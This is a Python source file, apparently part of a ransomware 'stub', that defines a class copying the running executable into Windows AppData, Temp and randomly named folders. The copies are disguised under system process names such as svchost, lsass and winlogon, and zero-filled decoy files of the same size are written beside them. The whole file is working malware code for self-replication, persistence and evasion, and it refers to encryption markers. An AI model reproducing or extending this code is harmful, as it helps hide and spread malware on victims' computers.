import os
import sys
import random
from typing import List
from io import BytesIO
from stub.utils import get_random_string
from stub.types import RSA_PUBLIC_KEY_HASH, ATTEMPTING_ENCRYPT_MAGIC

__all__ = ["Replicator"]

# Used to hide the exe
COMMON_PROCESSES = [
    "explorer",
    "cmd",
    "powershell",
    "svchost",
    "winlogon",
    "taskmgr",
    "dllhost",
    "csrss",
    "conhost",
    "lsass",
    "services",
    "searchui",
    "runtimebroker",
    "dwm",
    "rundll32",
    "wuauclt",
    "smartscreen",
]


class Replicator:
    def __init__(self) -> None:
        self.dest_dirs: List[str] = []
        self.locations: List[str] = []

        _ROAMING_APP_DATA = os.getenv("APPDATA")
        _LOCAL_APP_DATA = os.getenv("LOCALAPPDATA")

        assert not (_ROAMING_APP_DATA is None or _LOCAL_APP_DATA is None)
        self.ROAMING_APP_DATA = _ROAMING_APP_DATA
        self.LOCAL_APP_DATA = _LOCAL_APP_DATA

        self.locations.extend(
            [
                _ROAMING_APP_DATA,
                _LOCAL_APP_DATA,
                os.path.join(_ROAMING_APP_DATA, get_random_string(12)),
                os.path.join(_LOCAL_APP_DATA, get_random_string(12)),
                os.path.join(_LOCAL_APP_DATA, "Temp"),
                os.path.join(_ROAMING_APP_DATA, "ProgramData"),
            ]
        )

        self.create_if_not_exists()
        with open(os.path.abspath(sys.argv[0]), "rb") as f:
            self.stub_bytes = BytesIO(f.read())

    def create_attempt_magic_if_not_exists(self) -> bool:
        if not self.attempt_magic_exists():
            with open(
                os.path.join(self.LOCAL_APP_DATA, ATTEMPTING_ENCRYPT_MAGIC), "wb"
            ) as f:
                f.write(b"\x00" * 1024)
            return True

        return False

    def attempt_magic_exists(self) -> bool:
        return os.path.exists(
            os.path.join(self.LOCAL_APP_DATA, ATTEMPTING_ENCRYPT_MAGIC)
        )

    def delete_attempt_magic(self) -> None:
        path = os.path.join(self.LOCAL_APP_DATA, ATTEMPTING_ENCRYPT_MAGIC)
        if os.path.exists(path):
            os.remove(path)

    def create_if_not_exists(self) -> None:
        for location in self.locations:
            if not os.path.exists(location):
                os.makedirs(location)

    def replicate(self) -> None:
        # Only one will be the real exe
        rand_index = random.randint(0, len(self.locations) - 1)
        file_size = self.stub_bytes.getbuffer().nbytes
        for index, location in enumerate(self.locations):
            magic_file = rf"{location}\{RSA_PUBLIC_KEY_HASH}.dll"
            root_file = rf"{location}\{random.choice(COMMON_PROCESSES)}_{get_random_string(3)}.exe"
            # Extension here is arbitrary
            if os.path.exists(magic_file):
                continue

            with open(magic_file, "wb") as f:
                f.write(b"")

            with open(root_file, "wb") as f:
                if index == rand_index:
                    self.stub_bytes.seek(0)
                    f.write(self.stub_bytes.read())
                else:
                    f.write(b"\x00" * file_size)

            self.dest_dirs.append(root_file)
